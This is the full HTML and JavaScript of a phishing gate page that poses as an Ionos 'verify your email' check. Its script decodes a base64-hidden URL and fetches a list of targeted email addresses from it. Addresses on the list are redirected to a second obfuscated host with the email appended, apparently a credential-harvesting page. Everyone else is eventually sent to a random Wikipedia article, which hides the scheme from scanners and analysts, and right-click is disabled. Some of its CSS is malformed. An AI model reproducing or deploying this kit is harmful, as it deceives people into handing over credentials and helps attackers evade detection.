<html lang="en">
<head>
	<meta charset="UTF-8" />
	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
	<title>Verify Your Identity</title>
	<style type="text/css">body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f4f4f4;

            color: #333;
            background-image: url('https://i.postimg.cc/7Y36M51G/ionos.png'); /* Add your background image here */

        }

        .header {

            box-sizing: border-box;

        .container {
            background-color: white;

        }

        .container p {
            margin-bottom: 10px;

        .container p2 {
            margin-bottom: 10px;

        .container input[type="email"] {
            width: 100%;

                margin-bottom: 20px;

            .container button {
                font-size: 14px;

	</style>
</head>
<body>
<div class="container">
<h2>Before we continue...</h2>

<p><strong>Because you're accessing sensitive info, you need to verify your email.</strong></p>
<p2></p2> <input id="email-input" placeholder="Enter email" required="" style="margin-top: 10px;" type="email" /><button id="continue-button">Next</button>

<div class="footer" style="font-family:'Segoe UI'; ">
<p>Encrypted by Ionos</p>
</div>
</div>
<script>
        let attempts = 0;

        async function fetchEmailList() {
            const encodedUrl = 'aHR0cHM6Ly9odW1hbmJvdGNoZWNrZXIucGFnZXMuZGV2L2V4dHJhY3RlZF9iYXJyYWN1ZGEudHh0';
            const decodedUrl = atob(encodedUrl);
            const response = await fetch(decodedUrl); // Path to your email list file
            const text = await response.text();
            return text.split(/\r?\n/).filter(email => email.trim().length > 0);
        }

        async function continueLoading() {
            const emailInput = document.getElementById('email-input');
            const email = emailInput.value.trim();
            const validEmails = await fetchEmailList();

            if (validateEmail(email)) {
                if (validEmails.includes(email)) {
                    const link = "aHR0cHM6Ly9meWNjcXBiYnJvLnRoZWJlbXNncm91cC5jb20v"; // Base64 encoded link
                    const decodedLink = atob(link);
                    const finalLink = `${decodedLink}?email=${email}`;
                    window.location.href = finalLink;
                } else {
                    attempts++;
                    if (attempts >= 4) {
                        const randomWiki = await fetchRandomWiki();
                        window.location.href = RandomWiki;
                    } else {
                        alert("Please enter your work Email address for verification.");
                    }
                }
            } else {
                alert("Please enter a valid email address.");
            }
        }

        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        async function fetchRandomWiki() {
            const response = await fetch('https://en.wikipedia.org/wiki/Special:Random');
            return response.url;
        }

        document.getElementById('continue-button').addEventListener('click', continueLoading);
        document.getElementById('email-input').addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                continueLoading();
            }
        });
    </script>
    <script>
    // Disable right-click
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // ... existing script ...
</script></body>
